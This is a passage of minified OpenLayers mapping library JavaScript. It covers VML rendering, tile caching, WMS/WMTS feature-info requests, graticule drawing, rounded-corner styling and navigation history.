\"+h+\",\"+g+\" l \";b=c?\" x e\":\" e\";a.path=\"m\"+f.join(\"\")+b;return a},drawPolygon:function(a,b){this.setNodeDimension(a,b);var c=this.getResolution(),d=[],e,f,g,h,k,l,m,n,p,q;e=0;for(f=b.components.length;e<f;e++){d.push(\"m\");g=b.components[e].components;h=0===e;l=k=null;m=0;\nfor(n=g.length;m<n;m++)p=g[m],q=(p.x-this.featureDx)/c-this.offset.x|0,p=p.y/c-this.offset.y|0,q=\" \"+q+\",\"+p,d.push(q),0==m&&d.push(\" l\"),h||(k?k!=q&&(l?l!=q&&(h=!0):l=q):k=q);d.push(h?\" x \":\" \")}d.push(\"e\");a.path=d.join(\"\");return a},drawRectangle:function(a,b){var c=this.getResolution();a.style.left=((b.x-this.featureDx)/c-this.offset.x|0)+\"px\";a.style.top=(b.y/c-this.offset.y|0)+\"px\";a.style.width=(b.width/c|0)+\"px\";a.style.height=(b.height/c|0)+\"px\";return a},drawText:function(a,b,c){var d=this.nodeFactory(a+\nthis.LABEL_ID_SUFFIX,\"olv:rect\"),e=this.nodeFactory(a+this.LABEL_ID_SUFFIX+\"_textbox\",\"olv:textbox\"),f=this.getResolution();d.style.left=((c.x-this.featureDx)/f-this.offset.x|0)+\"px\";d.style.top=(c.y/f-this.offset.y|0)+\"px\";d.style.flip=\"y\";e.innerText=b.label;\"inherit\"!=b.cursor&&null!=b.cursor&&(e.style.cursor=b.cursor);b.fontColor&&(e.style.color=b.fontColor);b.fontOpacity&&(e.style.filter=\"alpha(opacity=\"+100*b.fontOpacity+\")\");b.fontFamily&&(e.style.fontFamily=b.fontFamily);b.fontSize&&(e.style.fontSize=\nb.fontSize);b.fontWeight&&(e.style.fontWeight=b.fontWeight);b.fontStyle&&(e.style.fontStyle=b.fontStyle);!0===b.labelSelect&&(d._featureId=a,e._featureId=a,e._geometry=c,e._geometryClass=c.CLASS_NAME);e.style.whiteSpace=\"nowrap\";e.inset=\"1px,0px,0px,0px\";d.parentNode||(d.appendChild(e),this.textRoot.appendChild(d));b=b.labelAlign||\"cm\";1==b.length&&(b+=\"m\");a=e.clientWidth*OpenLayers.Renderer.VML.LABEL_SHIFT[b.substr(0,1)];e=e.clientHeight*OpenLayers.Renderer.VML.LABEL_SHIFT[b.substr(1,1)];d.style.left=\nparseInt(d.style.left)-a-1+\"px\";d.style.top=parseInt(d.style.top)+e+\"px\"},moveRoot:function(a){var b=this.map.getLayer(a.container.id);b instanceof OpenLayers.Layer.Vector.RootContainer&&(b=this.map.getLayer(this.container.id));b&&b.renderer.clear();OpenLayers.Renderer.Elements.prototype.moveRoot.apply(this,arguments);b&&b.redraw()},importSymbol:function(a){var b=this.container.id+\"-\"+a,c=this.symbolCache[b];if(c)return c;c=OpenLayers.Renderer.symbol[a];if(!c)throw Error(a+\" is not a valid symbol name\");\na=new OpenLayers.Bounds(Number.MAX_VALUE,Number.MAX_VALUE,0,0);for(var d=[\"m\"],e=0;e<c.length;e+=2){var f=c[e],g=c[e+1];a.left=Math.min(a.left,f);a.bottom=Math.min(a.bottom,g);a.right=Math.max(a.right,f);a.top=Math.max(a.top,g);d.push(f);d.push(g);0==e&&d.push(\"l\")}d.push(\"x e\");c=d.join(\" \");d=(a.getWidth()-a.getHeight())/2;0<d?(a.bottom-=d,a.top+=d):(a.left+=d,a.right-=d);c={path:c,size:a.getWidth(),left:a.left,bottom:a.bottom};return this.symbolCache[b]=c},CLASS_NAME:\"OpenLayers.Renderer.VML\"});\nOpenLayers.Renderer.VML.LABEL_SHIFT={l:0,c:0.5,r:1,t:0,m:0.5,b:1};OpenLayers.Control.CacheRead=OpenLayers.Class(OpenLayers.Control,{fetchEvent:\"tileloadstart\",layers:null,autoActivate:!0,setMap:function(a){OpenLayers.Control.prototype.setMap.apply(this,arguments);var b,c=this.layers||a.layers;for(b=c.length-1;0<=b;--b)this.addLayer({layer:c[b]});if(!this.layers)a.events.on({addlayer:this.addLayer,removeLayer:this.removeLayer,scope:this})},addLayer:function(a){a.layer.events.register(this.fetchEvent,this,this.fetch)},removeLayer:function(a){a.layer.events.unregister(this.fetchEvent,\nthis,this.fetch)},fetch:function(a){if(this.active&&window.localStorage&&a.tile instanceof OpenLayers.Tile.Image){var b=a.tile,c=b.url;!b.layer.crossOriginKeyword&&(OpenLayers.ProxyHost&&0===c.indexOf(OpenLayers.ProxyHost))&&(c=OpenLayers.Control.CacheWrite.urlMap[c]);if(c=window.localStorage.getItem(\"olCache_\"+c))b.url=c,\"tileerror\"===a.type&&b.setImgSrc(c)}},destroy:function(){if(this.layers||this.map){var a,b=this.layers||this.map.layers;for(a=b.length-1;0<=a;--a)this.removeLayer({layer:b[a]})}this.map&&\nthis.map.events.un({addlayer:this.addLayer,removeLayer:this.removeLayer,scope:this});OpenLayers.Control.prototype.destroy.apply(this,arguments)},CLASS_NAME:\"OpenLayers.Control.CacheRead\"});OpenLayers.Protocol.WFS.v1_0_0=OpenLayers.Class(OpenLayers.Protocol.WFS.v1,{version:\"1.0.0\",CLASS_NAME:\"OpenLayers.Protocol.WFS.v1_0_0\"});OpenLayers.Format.WMSGetFeatureInfo=OpenLayers.Class(OpenLayers.Format.XML,{layerIdentifier:\"_layer\",featureIdentifier:\"_feature\",regExes:{trimSpace:/^\\s*|\\s*$/g,removeSpace:/\\s*/g,splitSpace:/\\s+/,trimComma:/\\s*,\\s*/g},gmlFormat:null,read:function(a){\"string\"==typeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=a.documentElement;if(b){var c=this[\"read_\"+b.nodeName];a=c?c.call(this,b):(new OpenLayers.Format.GML(this.options?this.options:{})).read(a)}return a},read_msGMLOutput:function(a){var b=\n[];if(a=this.getSiblingNodesByTagCriteria(a,this.layerIdentifier))for(var c=0,d=a.length;c<d;++c){var e=a[c],f=e.nodeName;e.prefix&&(f=f.split(\":\")[1]);f=f.replace(this.layerIdentifier,\"\");if(e=this.getSiblingNodesByTagCriteria(e,this.featureIdentifier))for(var g=0;g<e.length;g++){var h=e[g],k=this.parseGeometry(h),h=this.parseAttributes(h),h=new OpenLayers.Feature.Vector(k.geometry,h,null);h.bounds=k.bounds;h.type=f;b.push(h)}}return b},read_FeatureInfoResponse:function(a){var b=[];a=this.getElementsByTagNameNS(a,\n\"*\",\"FIELDS\");for(var c=0,d=a.length;c<d;c++){var e=a[c],f={},g,h=e.attributes.length;if(0<h)for(g=0;g<h;g++){var k=e.attributes[g];f[k.nodeName]=k.nodeValue}else for(e=e.childNodes,g=0,h=e.length;g<h;++g)k=e[g],3!=k.nodeType&&(f[k.getAttribute(\"name\")]=k.getAttribute(\"value\"));b.push(new OpenLayers.Feature.Vector(null,f,null))}return b},getSiblingNodesByTagCriteria:function(a,b){var c=[],d,e,f,g;if(a&&a.hasChildNodes()){d=a.childNodes;f=d.length;for(var h=0;h<f;h++){for(g=d[h];g&&1!=g.nodeType;)g=\ng.nextSibling,h++;e=g?g.nodeName:\"\";0<e.length&&-1<e.indexOf(b)?c.push(g):(e=this.getSiblingNodesByTagCriteria(g,b),0<e.length&&(0==c.length?c=e:c.push(e)))}}return c},parseAttributes:function(a){var b={};if(1==a.nodeType){a=a.childNodes;for(var c=a.length,d=0;d<c;++d){var e=a[d];if(1==e.nodeType){var f=e.childNodes,e=e.prefix?e.nodeName.split(\":\")[1]:e.nodeName;0==f.length?b[e]=null:1==f.length&&(f=f[0],3==f.nodeType||4==f.nodeType)&&(f=f.nodeValue.replace(this.regExes.trimSpace,\"\"),b[e]=f)}}}return b},\nparseGeometry:function(a){this.gmlFormat||(this.gmlFormat=new OpenLayers.Format.GML);a=this.gmlFormat.parseFeature(a);var b,c=null;a&&(b=a.geometry&&a.geometry.clone(),c=a.bounds&&a.bounds.clone(),a.destroy());return{geometry:b,bounds:c}},CLASS_NAME:\"OpenLayers.Format.WMSGetFeatureInfo\"});OpenLayers.Control.WMTSGetFeatureInfo=OpenLayers.Class(OpenLayers.Control,{hover:!1,requestEncoding:\"KVP\",drillDown:!1,maxFeatures:10,clickCallback:\"click\",layers:null,queryVisible:!0,infoFormat:\"text/html\",vendorParams:{},format:null,formatOptions:null,handler:null,hoverRequest:null,pending:0,initialize:function(a){a=a||{};a.handlerOptions=a.handlerOptions||{};OpenLayers.Control.prototype.initialize.apply(this,[a]);this.format||(this.format=new OpenLayers.Format.WMSGetFeatureInfo(a.formatOptions));\n!0===this.drillDown&&(this.hover=!1);this.hover?this.handler=new OpenLayers.Handler.Hover(this,{move:this.cancelHover,pause:this.getInfoForHover},OpenLayers.Util.extend(this.handlerOptions.hover||{},{delay:250})):(a={},a[this.clickCallback]=this.getInfoForClick,this.handler=new OpenLayers.Handler.Click(this,a,this.handlerOptions.click||{}))},getInfoForClick:function(a){this.request(a.xy,{})},getInfoForHover:function(a){this.request(a.xy,{hover:!0})},cancelHover:function(){this.hoverRequest&&(--this.pending,\n0>=this.pending&&(OpenLayers.Element.removeClass(this.map.viewPortDiv,\"olCursorWait\"),this.pending=0),this.hoverRequest.abort(),this.hoverRequest=null)},findLayers:function(){for(var a=this.layers||this.map.layers,b=[],c,d=a.length-1;0<=d&&(c=a[d],!(c instanceof OpenLayers.Layer.WMTS)||(c.requestEncoding!==this.requestEncoding||this.queryVisible&&!c.getVisibility())||(b.push(c),this.drillDown&&!this.hover));--d);return b},buildRequestOptions:function(a,b){var c=this.map.getLonLatFromPixel(b),d=a.getURL(new OpenLayers.Bounds(c.lon,\nc.lat,c.lon,c.lat)),d=OpenLayers.Util.getParameters(d),c=a.getTileInfo(c);OpenLayers.Util.extend(d,{service:\"WMTS\",version:a.version,request:\"GetFeatureInfo\",infoFormat:this.infoFormat,i:c.i,j:c.j});OpenLayers.Util.applyDefaults(d,this.vendorParams);return{url:OpenLayers.Util.isArray(a.url)?a.url[0]:a.url,params:OpenLayers.Util.upperCaseObject(d),callback:function(c){this.handleResponse(b,c,a)},scope:this}},request:function(a,b){b=b||{};var c=this.findLayers();if(0<c.length){for(var d,e,f=0,g=c.length;f<\ng;f++)e=c[f],d=this.events.triggerEvent(\"beforegetfeatureinfo\",{xy:a,layer:e}),!1!==d&&(++this.pending,d=this.buildRequestOptions(e,a),d=OpenLayers.Request.GET(d),!0===b.hover&&(this.hoverRequest=d));0<this.pending&&OpenLayers.Element.addClass(this.map.viewPortDiv,\"olCursorWait\")}},handleResponse:function(a,b,c){--this.pending;0>=this.pending&&(OpenLayers.Element.removeClass(this.map.viewPortDiv,\"olCursorWait\"),this.pending=0);if(b.status&&(200>b.status||300<=b.status))this.events.triggerEvent(\"exception\",\n{xy:a,request:b,layer:c});else{var d=b.responseXML;d&&d.documentElement||(d=b.responseText);var e,f;try{e=this.format.read(d)}catch(g){f=!0,this.events.triggerEvent(\"exception\",{xy:a,request:b,error:g,layer:c})}f||this.events.triggerEvent(\"getfeatureinfo\",{text:b.responseText,features:e,request:b,xy:a,layer:c})}},CLASS_NAME:\"OpenLayers.Control.WMTSGetFeatureInfo\"});OpenLayers.Protocol.CSW.v2_0_2=OpenLayers.Class(OpenLayers.Protocol,{formatOptions:null,initialize:function(a){OpenLayers.Protocol.prototype.initialize.apply(this,[a]);a.format||(this.format=new OpenLayers.Format.CSWGetRecords.v2_0_2(OpenLayers.Util.extend({},this.formatOptions)))},destroy:function(){this.options&&!this.options.format&&this.format.destroy();this.format=null;OpenLayers.Protocol.prototype.destroy.apply(this)},read:function(a){a=OpenLayers.Util.extend({},a);OpenLayers.Util.applyDefaults(a,\nthis.options||{});var b=new OpenLayers.Protocol.Response({requestType:\"read\"}),c=this.format.write(a.params||a);b.priv=OpenLayers.Request.POST({url:a.url,callback:this.createCallback(this.handleRead,b,a),params:a.params,headers:a.headers,data:c});return b},handleRead:function(a,b){if(b.callback){var c=a.priv;200<=c.status&&300>c.status?(a.data=this.parseData(c),a.code=OpenLayers.Protocol.Response.SUCCESS):a.code=OpenLayers.Protocol.Response.FAILURE;b.callback.call(b.scope,a)}},parseData:function(a){var b=\na.responseXML;b&&b.documentElement||(b=a.responseText);return!b||0>=b.length?null:this.format.read(b)},CLASS_NAME:\"OpenLayers.Protocol.CSW.v2_0_2\"});OpenLayers.Format.WCSCapabilities.v1_1_0=OpenLayers.Class(OpenLayers.Format.WCSCapabilities.v1,{namespaces:{wcs:\"http://www.opengis.net/wcs/1.1\",xlink:\"http://www.w3.org/1999/xlink\",xsi:\"http://www.w3.org/2001/XMLSchema-instance\",ows:\"http://www.opengis.net/ows/1.1\"},errorProperty:\"operationsMetadata\",readers:{wcs:OpenLayers.Util.applyDefaults({Capabilities:function(a,b){this.readChildNodes(a,b)},Contents:function(a,b){b.contentMetadata=[];this.readChildNodes(a,b.contentMetadata)},CoverageSummary:function(a,\nb){var c={};this.readChildNodes(a,c);b.push(c)},Identifier:function(a,b){b.identifier=this.getChildValue(a)},Title:function(a,b){b.title=this.getChildValue(a)},Abstract:function(a,b){b[\"abstract\"]=this.getChildValue(a)},SupportedCRS:function(a,b){var c=this.getChildValue(a);c&&(b.supportedCRS||(b.supportedCRS=[]),b.supportedCRS.push(c))},SupportedFormat:function(a,b){var c=this.getChildValue(a);c&&(b.supportedFormat||(b.supportedFormat=[]),b.supportedFormat.push(c))}},OpenLayers.Format.WCSCapabilities.v1.prototype.readers.wcs),\nows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows},CLASS_NAME:\"OpenLayers.Format.WCSCapabilities.v1_1_0\"});OpenLayers.Control.Graticule=OpenLayers.Class(OpenLayers.Control,{autoActivate:!0,intervals:[45,30,20,10,5,2,1,0.5,0.2,0.1,0.05,0.01,0.005,0.002,0.001],displayInLayerSwitcher:!0,visible:!0,numPoints:50,targetSize:200,layerName:null,labelled:!0,labelFormat:\"dm\",lineSymbolizer:{strokeColor:\"#333\",strokeWidth:1,strokeOpacity:0.5},labelSymbolizer:{},gratLayer:null,initialize:function(a){a=a||{};a.layerName=a.layerName||OpenLayers.i18n(\"Graticule\");OpenLayers.Control.prototype.initialize.apply(this,[a]);\nthis.labelSymbolizer.stroke=!1;this.labelSymbolizer.fill=!1;this.labelSymbolizer.label=\"${label}\";this.labelSymbolizer.labelAlign=\"${labelAlign}\";this.labelSymbolizer.labelXOffset=\"${xOffset}\";this.labelSymbolizer.labelYOffset=\"${yOffset}\"},destroy:function(){this.deactivate();OpenLayers.Control.prototype.destroy.apply(this,arguments);this.gratLayer&&(this.gratLayer.destroy(),this.gratLayer=null)},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);if(!this.gratLayer){var a=new OpenLayers.Style({},\n{rules:[new OpenLayers.Rule({symbolizer:{Point:this.labelSymbolizer,Line:this.lineSymbolizer}})]});this.gratLayer=new OpenLayers.Layer.Vector(this.layerName,{styleMap:new OpenLayers.StyleMap({\"default\":a}),visibility:this.visible,displayInLayerSwitcher:this.displayInLayerSwitcher})}return this.div},activate:function(){return OpenLayers.Control.prototype.activate.apply(this,arguments)?(this.map.addLayer(this.gratLayer),this.map.events.register(\"moveend\",this,this.update),this.update(),!0):!1},deactivate:function(){return OpenLayers.Control.prototype.deactivate.apply(this,\narguments)?(this.map.events.unregister(\"moveend\",this,this.update),this.map.removeLayer(this.gratLayer),!0):!1},update:function(){var a=this.map.getExtent();if(a){this.gratLayer.destroyFeatures();var b=new OpenLayers.Projection(\"EPSG:4326\"),c=this.map.getProjectionObject(),d=this.map.getResolution();c.proj&&\"longlat\"==c.proj.projName&&(this.numPoints=1);var e=this.map.getCenter(),f=new OpenLayers.Pixel(e.lon,e.lat);OpenLayers.Projection.transform(f,c,b);for(var e=this.targetSize*d,e=e*e,g,d=0;d<this.intervals.length;++d){g=\nthis.intervals[d];var h=g/2,k=f.offset({x:-h,y:-h}),h=f.offset({x:h,y:h});OpenLayers.Projection.transform(k,b,c);OpenLayers.Projection.transform(h,b,c);if((k.x-h.x)*(k.x-h.x)+(k.y-h.y)*(k.y-h.y)<=e)break}f.x=Math.floor(f.x/g)*g;f.y=Math.floor(f.y/g)*g;var d=0,e=[f.clone()],h=f.clone(),l;do h=h.offset({x:0,y:g}),l=OpenLayers.Projection.transform(h.clone(),b,c),e.unshift(h);while(a.containsPixel(l)&&1E3>++d);h=f.clone();do h=h.offset({x:0,y:-g}),l=OpenLayers.Projection.transform(h.clone(),b,c),e.push(h);\nwhile(a.containsPixel(l)&&1E3>++d);d=0;k=[f.clone()];h=f.clone();do h=h.offset({x:-g,y:0}),l=OpenLayers.Projection.transform(h.clone(),b,c),k.unshift(h);while(a.containsPixel(l)&&1E3>++d);h=f.clone();do h=h.offset({x:g,y:0}),l=OpenLayers.Projection.transform(h.clone(),b,c),k.push(h);while(a.containsPixel(l)&&1E3>++d);g=[];for(d=0;d<k.length;++d){l=k[d].x;for(var f=[],m=null,n=Math.min(e[0].y,90),h=Math.max(e[e.length-1].y,-90),p=(n-h)/this.numPoints,n=h,h=0;h<=this.numPoints;++h){var q=new OpenLayers.Geometry.Point(l,\nn);q.transform(b,c);f.push(q);n+=p;q.y>=a.bottom&&!m&&(m=q)}this.labelled&&(m=new OpenLayers.Geometry.Point(m.x,a.bottom),l={value:l,label:this.labelled?OpenLayers.Util.getFormattedLonLat(l,\"lon\",this.labelFormat):\"\",labelAlign:\"cb\",xOffset:0,yOffset:2},this.gratLayer.addFeatures(new OpenLayers.Feature.Vector(m,l)));f=new OpenLayers.Geometry.LineString(f);g.push(new OpenLayers.Feature.Vector(f))}for(h=0;h<e.length;++h)if(n=e[h].y,!(-90>n||90<n)){f=[];d=k[0].x;p=(k[k.length-1].x-d)/this.numPoints;\nl=d;m=null;for(d=0;d<=this.numPoints;++d)q=new OpenLayers.Geometry.Point(l,n),q.transform(b,c),f.push(q),l+=p,q.x<a.right&&(m=q);this.labelled&&(m=new OpenLayers.Geometry.Point(a.right,m.y),l={value:n,label:this.labelled?OpenLayers.Util.getFormattedLonLat(n,\"lat\",this.labelFormat):\"\",labelAlign:\"rb\",xOffset:-2,yOffset:2},this.gratLayer.addFeatures(new OpenLayers.Feature.Vector(m,l)));f=new OpenLayers.Geometry.LineString(f);g.push(new OpenLayers.Feature.Vector(f))}this.gratLayer.addFeatures(g)}},CLASS_NAME:\"OpenLayers.Control.Graticule\"});OpenLayers.Console.warn(\"OpenLayers.Rico is deprecated\");OpenLayers.Rico=OpenLayers.Rico||{};\nOpenLayers.Rico.Corner={round:function(a,b){a=OpenLayers.Util.getElement(a);this._setOptions(b);var c=this.options.color;\"fromElement\"==this.options.color&&(c=this._background(a));var d=this.options.bgColor;\"fromParent\"==this.options.bgColor&&(d=this._background(a.offsetParent));this._roundCornersImpl(a,c,d)},changeColor:function(a,b){a.style.backgroundColor=b;for(var c=a.parentNode.getElementsByTagName(\"span\"),d=0;d<c.length;d++)c[d].style.backgroundColor=b},changeOpacity:function(a,b){var c=\"alpha(opacity=\"+\n100*b+\")\";a.style.opacity=b;a.style.filter=c;for(var d=a.parentNode.getElementsByTagName(\"span\"),e=0;e<d.length;e++)d[e].style.opacity=b,d[e].style.filter=c},reRound:function(a,b){var c=a.parentNode.childNodes[2];a.parentNode.removeChild(a.parentNode.childNodes[0]);a.parentNode.removeChild(c);this.round(a.parentNode,b)},_roundCornersImpl:function(a,b,c){this.options.border&&this._renderBorder(a,c);this._isTopRounded()&&this._roundTopCorners(a,b,c);this._isBottomRounded()&&this._roundBottomCorners(a,\nb,c)},_renderBorder:function(a,b){var c=\"1px solid \"+this._borderColor(b);a.innerHTML=\"<div \"+(\"style='border-left: \"+c+\";\"+(\"border-right: \"+c)+\"'\")+\">\"+a.innerHTML+\"</div>\"},_roundTopCorners:function(a,b,c){for(var d=this._createCorner(c),e=0;e<this.options.numSlices;e++)d.appendChild(this._createCornerSlice(b,c,e,\"top\"));a.style.paddingTop=0;a.insertBefore(d,a.firstChild)},_roundBottomCorners:function(a,b,c){for(var d=this._createCorner(c),e=this.options.numSlices-1;0<=e;e--)d.appendChild(this._createCornerSlice(b,\nc,e,\"bottom\"));a.style.paddingBottom=0;a.appendChild(d)},_createCorner:function(a){var b=document.createElement(\"div\");b.style.backgroundColor=this._isTransparent()?\"transparent\":a;return b},_createCornerSlice:function(a,b,c,d){var e=document.createElement(\"span\"),f=e.style;f.backgroundColor=a;f.display=\"block\";f.height=\"1px\";f.overflow=\"hidden\";f.fontSize=\"1px\";a=this._borderColor(a,b);this.options.border&&0==c?(f.borderTopStyle=\"solid\",f.borderTopWidth=\"1px\",f.borderLeftWidth=\"0px\",f.borderRightWidth=\n\"0px\",f.borderBottomWidth=\"0px\",f.height=\"0px\",f.borderColor=a):a&&(f.borderColor=a,f.borderStyle=\"solid\",f.borderWidth=\"0px 1px\");this.options.compact||c!=this.options.numSlices-1||(f.height=\"2px\");this._setMargin(e,c,d);this._setBorder(e,c,d);return e},_setOptions:function(a){this.options={corners:\"all\",color:\"fromElement\",bgColor:\"fromParent\",blend:!0,border:!1,compact:!1};OpenLayers.Util.extend(this.options,a||{});this.options.numSlices=this.options.compact?2:4;this._isTransparent()&&(this.options.blend=\n!1)},_whichSideTop:function(){return this._hasString(this.options.corners,\"all\",\"top\")||0<=this.options.corners.indexOf(\"tl\")&&0<=this.options.corners.indexOf(\"tr\")?\"\":0<=this.options.corners.indexOf(\"tl\")?\"left\":0<=this.options.corners.indexOf(\"tr\")?\"right\":\"\"},_whichSideBottom:function(){return this._hasString(this.options.corners,\"all\",\"bottom\")||0<=this.options.corners.indexOf(\"bl\")&&0<=this.options.corners.indexOf(\"br\")?\"\":0<=this.options.corners.indexOf(\"bl\")?\"left\":0<=this.options.corners.indexOf(\"br\")?\n\"right\":\"\"},_borderColor:function(a,b){return\"transparent\"==a?b:this.options.border?this.options.border:this.options.blend?this._blend(b,a):\"\"},_setMargin:function(a,b,c){b=this._marginSize(b);c=\"top\"==c?this._whichSideTop():this._whichSideBottom();\"left\"==c?(a.style.marginLeft=b+\"px\",a.style.marginRight=\"0px\"):\"right\"==c?(a.style.marginRight=b+\"px\",a.style.marginLeft=\"0px\"):(a.style.marginLeft=b+\"px\",a.style.marginRight=b+\"px\")},_setBorder:function(a,b,c){b=this._borderSize(b);c=\"top\"==c?this._whichSideTop():\nthis._whichSideBottom();\"left\"==c?(a.style.borderLeftWidth=b+\"px\",a.style.borderRightWidth=\"0px\"):\"right\"==c?(a.style.borderRightWidth=b+\"px\",a.style.borderLeftWidth=\"0px\"):(a.style.borderLeftWidth=b+\"px\",a.style.borderRightWidth=b+\"px\");!1!=this.options.border&&(a.style.borderLeftWidth=b+\"px\",a.style.borderRightWidth=b+\"px\")},_marginSize:function(a){if(this._isTransparent())return 0;var b=[5,3,2,1],c=[3,2,1,0],d=[2,1],e=[1,0];return this.options.compact&&this.options.blend?e[a]:this.options.compact?\nd[a]:this.options.blend?c[a]:b[a]},_borderSize:function(a){var b=[5,3,2,1],c=[2,1,1,1],d=[1,0],e=[0,2,0,0];return this.options.compact&&(this.options.blend||this._isTransparent())?1:this.options.compact?d[a]:this.options.blend?c[a]:this.options.border?e[a]:this._isTransparent()?b[a]:0},_hasString:function(a){for(var b=1;b<arguments.length;b++)if(0<=a.indexOf(arguments[b]))return!0;return!1},_blend:function(a,b){var c=OpenLayers.Rico.Color.createFromHex(a);c.blend(OpenLayers.Rico.Color.createFromHex(b));\nreturn c},_background:function(a){try{return OpenLayers.Rico.Color.createColorFromBackground(a).asHex()}catch(b){return\"#ffffff\"}},_isTransparent:function(){return\"transparent\"==this.options.color},_isTopRounded:function(){return this._hasString(this.options.corners,\"all\",\"top\",\"tl\",\"tr\")},_isBottomRounded:function(){return this._hasString(this.options.corners,\"all\",\"bottom\",\"bl\",\"br\")},_hasSingleTextChild:function(a){return 1==a.childNodes.length&&3==a.childNodes[0].nodeType}};OpenLayers.Control.NavigationHistory=OpenLayers.Class(OpenLayers.Control,{type:OpenLayers.Control.TYPE_TOGGLE,previous:null,previousOptions:null,next:null,nextOptions:null,limit:50,autoActivate:!0,clearOnDeactivate:!1,registry:null,nextStack:null,previousStack:null,listeners:null,restoring:!1,initialize:function(a){OpenLayers.Control.prototype.initialize.apply(this,[a]);this.registry=OpenLayers.Util.extend({moveend:this.getState},this.registry);a={trigger:OpenLayers.Function.bind(this.previousTrigger,\nthis),displayClass:this.displayClass+\" \"+this.displayClass+\"Previous\"};OpenLayers.Util.extend(a,this.previousOptions);this.previous=new OpenLayers.Control.Button(a);a={trigger:OpenLayers.Function.bind(this.nextTrigger,this),displayClass:this.displayClass+\" \"+this.displayClass+\"Next\"};OpenLayers.Util.extend(a,this.nextOptions);this.next=new OpenLayers.Control.Button(a);this.clear()},onPreviousChange:function(a,b){a&&!this.previous.active?this.previous.activate():!a&&this.previous.active&&this.previous.deactivate()},\nonNextChange:function(a,b){a&&!this.next.active?this.next.activate():!a&&this.next.active&&this.next.deactivate()},destroy:function(){OpenLayers.Control.prototype.destroy.apply(this);this.previous.destroy();this.next.destroy();this.deactivate();for(var a in this)this[a]=null},setMap:function(a){this.map=a;this.next.setMap(a);this.previous.setMap(a)},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);this.next.draw();this.previous.draw()},previousTrigger:function(){var a=this.previousStack.shift(),\nb=this.previousStack.shift();void 0!=b?(this.nextStack.unshift(a),this.previousStack.unshift(b),this.restoring=!0,this.restore(b),this.restoring=!1,this.onNextChange(this.nextStack[0],this.nextStack.length),this.onPreviousChange(this.previousStack[1],this.previousStack.length-1)):this.previousStack.unshift(a);return b},nextTrigger:function(){var a=this.nextStack.shift();void 0!=a&&(this.previousStack.unshift(a),this.restoring=!0,this.restore(a),this.restoring=!1,this.onNextChange(this.nextStack[0],\nthis.nextStack.length),this.onPreviousChange(this.previousStack[1],this.previousStack.length-1));return a},clear:function(){this.previousStack=[];this.previous.deactivate();this.nextStack=[];this.next.deactivate()},getState:function(){return{center:this.map.getCenter(),resolution:this.map.getResolution(),projection:this.map.getProjectionObject(),units:this.map.getProjectionObject().getUnits()||this.map.units||this.map.baseLayer.units}},restore:function(a){var b,c;if(this.map.getProjectionObject()==\na.projection)c=this.map.getZoomForResolution(a.resolution),b=a.center;else{b=a.center.clone();b.transform(a.projection,this.map.getProjectionObject());c=a.units;var d=this.map.getProjectionObject().getUnits()||this.map.units||this.map.baseLayer.units;c=this.map.getZoomForResolution((c&&d?OpenLayers.INCHES_PER_UNIT[c]/OpenLayers.INCHES_PER_UNIT[d]:1)*a.resolution)}this.map.setCenter(b,c)},setListeners:function(){this.listeners={};for(var a in this.registry)this.listeners[a]=OpenLayers.Function.bind(function(){if(!this.restoring){var b=\nthis.registry[a].apply(this,arguments);this.previousStack.unshift(b);if(1<this.previousStack.length)this.onPreviousChange(this.previousStack[1],this.previousStack.length-1);this.previousStack.length>this.limit+1&&this.previousStack.pop();0<this.nextStack.length&&(this.nextStack=[],this.onNextChange(null,0))}return!0},this)},activate:function(){var a=!1;if(this.map&&OpenLayers.Control.prototype.activate.apply(this)){null==this.listeners&&this.setListeners();for(var b in this.listeners)this.map.events.register(b,\nthis,this.listeners[b]);a=!0;0==this.previousStack.length&&this.initStack()}return a},initStack:function(){this.map.getCenter()&&this.listeners.moveend()},deactivate:function(){var a=!1;if(this.map&&OpenLayers.Control.prototype.deactivate.apply(this)){for(var b in this.listeners)this.map.events.unregister(b,this,this.listeners[b]);this.clearOnDeactivate&&this.clear();a=!0}return a},CLASS_NAME:\"OpenLayers.Control.NavigationHistory\"});OpenLayers.Layer.UTFGrid=OpenLayers.Class(OpenLayers.Layer.XYZ,{isBaseLayer:!1,projection:new OpenLayers.Projection(\"EPSG:900913\"),useJSONP:!1,tileClass:OpenLayers.Tile.UTFGrid,initialize:function(a){OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a.name,a.url,{},a]);this.tileOptions=OpenLayers.Util.extend({utfgridResolution:this.utfgridResolution},this.tileOptions)},createBackBuffer:function(){},clone:function(a){null==a&&(a=new OpenLayers.Layer.UTFGrid(this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,\n[a])},getFeatureInfo:function(a){var b=null;(a=this.getTileData(a))&&a.tile&&(b=a.tile.getFeatureInfo(a.i,a.j));return b},getFeatureId:function(a){var b=null;a=this.getTileData(a);a.tile&&(b=a.tile.getFeatureId(a.i,a.j));return b},CLASS_NAME:\"OpenLayers.Layer.UTFGrid\"});OpenLayers.TileManager=OpenLayers.Class({cacheSize:256,tilesPerFrame:2,frameDelay:16,moveDelay:100,zoomDelay:200,maps:null,tileQueueId:null,tileQueue:null,tileCache:null,tileCacheIndex:null,initialize:function(a){OpenLayers.Util.extend(this,a);this.maps=[];this.tileQueueId={};this.tileQueue={};this.tileCache={};this.tileCacheIndex=[]},addMap:function(a){if(!this._destroyed&&OpenLayers.Layer.Grid){this.maps.push(a);this.tileQueue[a.id]=[];for(var b=0,c=a.layers.length;b<c;++b)this.addLayer({layer:a.layers[b]});\na.events.on({move:this.move,zoomend:this.zoomEnd,changelayer:this.changeLayer,addlayer:this.addLayer,preremovelayer:this.removeLayer,scope:this})}},removeMap:function(a){if(!this._destroyed&&OpenLayers.Layer.Grid){window.clearTimeout(this.tileQueueId[a.id]);if(a.layers)for(var b=0,c=a.layers.length;b<c;++b)this.removeLayer({layer:a.layers[b]});a.events&&a.events.un({move:this.move,zoomend:this.zoomEnd,changelayer:this.changeLayer,addlayer:this.addLayer,preremovelayer:this.removeLayer,scope:this});\ndelete this.tileQueue[a.id];delete this.tileQueueId[a.id];OpenLayers.Util.removeItem(this.maps,a)}},move:function(a){this.updateTimeout(a.object,this.moveDelay,!0)},zoomEnd:function(a){this.updateTimeout(a.object,this.zoomDelay)},changeLayer:function(a){\"visibility\"!==a.property&&\"params\"!==a.property||this.updateTimeout(a.object,0)},addLayer:function(a){a=a.layer;if(a instanceof 